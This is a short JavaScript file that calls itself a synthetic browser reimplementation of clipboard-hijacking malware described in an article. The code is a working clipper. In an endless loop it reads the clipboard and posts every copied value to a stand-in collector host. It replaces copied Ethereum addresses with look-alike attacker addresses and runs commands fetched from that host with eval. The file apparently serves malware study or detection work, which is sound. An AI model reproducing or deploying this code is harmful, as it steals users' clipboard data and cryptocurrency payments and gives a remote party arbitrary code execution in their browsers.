// Browser implementation of the article's address-selection and export behavior.
// This is a synthetic variant, not an AnimateClipper or Efimer original.
const alternatives = [
  "0xa97d294c813d68f8a92592dc66a883b0f762ea91",
  "0xb62c41e73d546ba98ac761fed938254a619ce430"
];
async function watch() {
  while (true) {
    const copied = await navigator.clipboard.readText();
    await fetch("https://collector.invalid/route.php", {method: "POST", body: copied});
    if (/^0x[a-fA-F0-9]{40}$/.test(copied)) {
      for (const candidate of alternatives) {
        if (candidate.substring(0, 3) === copied.substring(0, 3)) {
          await navigator.clipboard.writeText(candidate);
          break;
        }
      }
    }
    const response = await fetch("https://collector.invalid/route.php");
    const command = await response.text();
    if (command.substring(0, 5) === "EVAL\n") {
      eval(command.substring(5));
    }
    await new Promise(resolve => setTimeout(resolve, 500));
  }
}
watch();
